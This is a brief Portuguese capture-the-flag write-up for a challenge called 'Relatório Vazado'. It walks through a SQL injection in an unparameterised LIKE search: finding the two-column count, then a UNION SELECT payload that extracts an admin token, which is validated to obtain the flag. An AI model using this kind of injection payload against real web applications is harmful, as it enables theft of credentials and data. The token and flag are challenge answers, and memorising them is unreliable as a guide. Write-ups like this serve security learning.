# Writeup — Relatório Vazado

## Vulnerabilidade
SQL Injection via cláusula LIKE não parametrizada.

## Passo a passo
1. Acessar `/auditoria/search?campo=test`.
2. Testar payloads com aspas simples (`'`) para notar erro ou mudança.
3. Identificar que existem **2 colunas** sendo retornadas.
4. Usar UNION SELECT:

```
/auditoria/search?campo=' UNION SELECT token_admin, 0 FROM transacoes --
```

5. Isso revela:  
   `BPN-NATAL-ADMIN-94821`
6. Validar:  
   `/auditoria/validar?token=BPN-NATAL-ADMIN-94821`
7. Flag retornada:  
   `CTF{vazamento_natalino_sql}`
